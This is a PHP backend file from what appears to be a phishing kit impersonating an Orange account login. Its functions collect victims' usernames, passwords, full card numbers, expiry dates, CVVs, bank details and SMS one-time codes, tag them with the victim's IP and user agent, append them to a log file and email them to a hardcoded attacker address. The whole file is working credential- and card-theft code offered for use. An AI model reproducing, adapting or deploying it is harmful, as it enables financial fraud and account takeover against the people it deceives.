<?php
session_start();
// EMAIL
$EMAIL = "mrc15c0.96@gmail.com";
// EMAIL
include'function.php';


function Login($INF){
global $ip;
global $TIME_DATE;
global $EMAIL;    
$MSG = "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>COMPTE ORANGE</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU COMPTE</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [ID] = <font style='color:#0070ba;'>".$INF['user']."</font><br>
<font style='color:#9c0000;'>℗</font> [MOT DE PASS] = <font style='color:#0070ba;'>".$INF['pass']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU VICTIME</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP] = <font style='color:#0070ba;'>".$ip."</font><br>
<font style='color:#9c0000;'>✪</font> [DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']." </font><br>
################## <font style='color: #820000;'>BY SBROCKER</font> #####################
</div></html><br><br>";
$SUB = "LOGIN INFO : ".$INF['id']. "IP : ". $ip;
$HEA .= "From:0R4NG2<noreply@logs.com>";
$HEA .= "\n";
$HEA .= "Content-type: text/html; charset=UTF-8\n";
file_put_contents('../../../txt.html', $MSG.PHP_EOL, FILE_APPEND);
@mail($EMAIL, $SUB, $MSG, $HEA);
}

function Card($CC,$BANK){
$_SESSION['CC'] = $CC;
$_SESSION['BNK'] = $BANK;
global $ip;
global $TIME_DATE;
global $EMAIL;    
$MSG = "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>COMPTE ORANGE</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>Card</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Type De Carte] = <font style='color:#0070ba;'>".$CC['type']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Carte] = <font style='color:#0070ba;'>".$CC['num']."</font><br>
<font style='color:#9c0000;'>℗</font> [Date D'expiration] = <font style='color:#0070ba;'>".$CC['expmonth'].'/'.$CC['expyear']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Controle] = <font style='color:#0070ba;'>".$CC['cvv']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU BANK</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Nom Du Bank] = <font style='color:#0070ba;'>".$BANK->bank->name."</font><br>
<font style='color:#9c0000;'>℗</font> [BIN] = <font style='color:#0070ba;'>".substr($CC['num'],0,6)."</font><br>
<font style='color:#9c0000;'>℗</font> [Class Du Carte] = <font style='color:#0070ba;'>".ucfirst($BANK->type) .' | '. ucfirst($BANK->brand)."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU VICTIME</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP] = <font style='color:#0070ba;'>".$ip."</font><br>
<font style='color:#9c0000;'>✪</font> [DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']." </font><br>
################## <font style='color: #820000;'>BY SBROCKER</font> #####################
</div></html><br><br>";
$SUB = "Card INFO : ".$INF['id']. "IP : ". $ip;
$HEA .= "From:0R4NG2<noreply@logs.com>";
$HEA .= "\n";
$HEA .= "Content-type: text/html; charset=UTF-8\n";
file_put_contents('../../../txt.html', $MSG.PHP_EOL, FILE_APPEND);
@mail($EMAIL, $SUB, $MSG, $HEA);
}

function Sms1($VBV,$CC,$BANK){
global $ip;
global $TIME_DATE;
global $EMAIL;    
$MSG = "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>COMPTE ORANGE</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>SMS</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [SMS] = <font style='color:#0070ba;'>".$VBV['sms']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU CARTE</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Type De Carte] = <font style='color:#0070ba;'>".$CC['type']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Carte] = <font style='color:#0070ba;'>".$CC['num']."</font><br>
<font style='color:#9c0000;'>℗</font> [Date D'expiration] = <font style='color:#0070ba;'>".$CC['expmonth'].'/'.$CC['expyear']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Controle] = <font style='color:#0070ba;'>".$CC['cvv']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU BANK</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Nom Du Bank] = <font style='color:#0070ba;'>".$BANK->bank->name."</font><br>
<font style='color:#9c0000;'>℗</font> [BIN] = <font style='color:#0070ba;'>".substr($CC['num'],0,6)."</font><br>
<font style='color:#9c0000;'>℗</font> [Class Du Carte] = <font style='color:#0070ba;'>".ucfirst($BANK->type) .' | '. ucfirst($BANK->brand)."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU VICTIME</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP] = <font style='color:#0070ba;'>".$ip."</font><br>
<font style='color:#9c0000;'>✪</font> [DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']." </font><br>
################## <font style='color: #820000;'>BY SBROCKER</font> #####################
</div></html><br><br>";
$SUB = "SMS 1 "."IP : ". $ip; 
$HEA .= "From:0R4NG2<noreply@logs.com>";
$HEA .= "MIME-Version: 1.0\n";
$HEA .= "Content-type: text/html; charset=UTF-8\n";
file_put_contents('../../../txt.html', $MSG.PHP_EOL, FILE_APPEND);
@mail($EMAIL, $SUB, $MSG, $HEA);
}

function Sms2($VBV,$CC,$BANK){
global $ip;
global $TIME_DATE;
global $EMAIL;    
$MSG = "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>COMPTE ORANGE</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>SMS2</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [SMS] = <font style='color:#0070ba;'>".$VBV['sms']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU CARTE</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Type De Carte] = <font style='color:#0070ba;'>".$CC['type']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Carte] = <font style='color:#0070ba;'>".$CC['num']."</font><br>
<font style='color:#9c0000;'>℗</font> [Date D'expiration] = <font style='color:#0070ba;'>".$CC['expmonth'].'/'.$CC['expyear']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Controle] = <font style='color:#0070ba;'>".$CC['cvv']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU BANK</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Nom Du Bank] = <font style='color:#0070ba;'>".$BANK->bank->name."</font><br>
<font style='color:#9c0000;'>℗</font> [BIN] = <font style='color:#0070ba;'>".substr($CC['num'],0,6)."</font><br>
<font style='color:#9c0000;'>℗</font> [Class Du Carte] = <font style='color:#0070ba;'>".ucfirst($BANK->type) .' | '. ucfirst($BANK->brand)."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU VICTIME</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP] = <font style='color:#0070ba;'>".$ip."</font><br>
<font style='color:#9c0000;'>✪</font> [DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']." </font><br>
################## <font style='color: #820000;'>BY SBROCKER</font> #####################
</div></html><br><br>";
$SUB = "SMS 2 ". "IP : ". $ip; 
$HEA .= "From:0R4NG2<noreply@logs.com>";
$HEA .= "MIME-Version: 1.0\n";
$HEA .= "Content-type: text/html; charset=UTF-8\n";
file_put_contents('../../../txt.html', $MSG.PHP_EOL, FILE_APPEND);
@mail($EMAIL, $SUB, $MSG, $HEA);
}


function Sms3($VBV,$CC,$BANK){
global $ip;
global $TIME_DATE;
global $EMAIL;    
$MSG = "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>COMPTE ORANGE</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>SMS3</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [SMS] = <font style='color:#0070ba;'>".$VBV['sms']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU CARTE</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Type De Carte] = <font style='color:#0070ba;'>".$CC['type']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Carte] = <font style='color:#0070ba;'>".$CC['num']."</font><br>
<font style='color:#9c0000;'>℗</font> [Date D'expiration] = <font style='color:#0070ba;'>".$CC['expmonth'].'/'.$CC['expyear']."</font><br>
<font style='color:#9c0000;'>℗</font> [Numero De Controle] = <font style='color:#0070ba;'>".$CC['cvv']."</font><br>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU BANK</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Nom Du Bank] = <font style='color:#0070ba;'>".$BANK->bank->name."</font><br>
<font style='color:#9c0000;'>℗</font> [BIN] = <font style='color:#0070ba;'>".substr($CC['num'],0,6)."</font><br>
<font style='color:#9c0000;'>℗</font> [Class Du Carte] = <font style='color:#0070ba;'>".ucfirst($BANK->type) .' | '. ucfirst($BANK->brand)."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>INFORMATIONS DU VICTIME</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP] = <font style='color:#0070ba;'>".$ip."</font><br>
<font style='color:#9c0000;'>✪</font> [DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']." </font><br>
################## <font style='color: #820000;'>BY SBROCKER</font> #####################
</div></html><br><br>";
$SUB = "SMS 3 INFO :"."IP : ". $ip; 
$HEA .= "From:0R4NG2<noreply@logs.com>";
$HEA .= "MIME-Version: 1.0\n";
$HEA .= "Content-type: text/html; charset=UTF-8\n";
file_put_contents('../../../txt.html', $MSG.PHP_EOL, FILE_APPEND);
@mail($EMAIL, $SUB, $MSG, $HEA);
}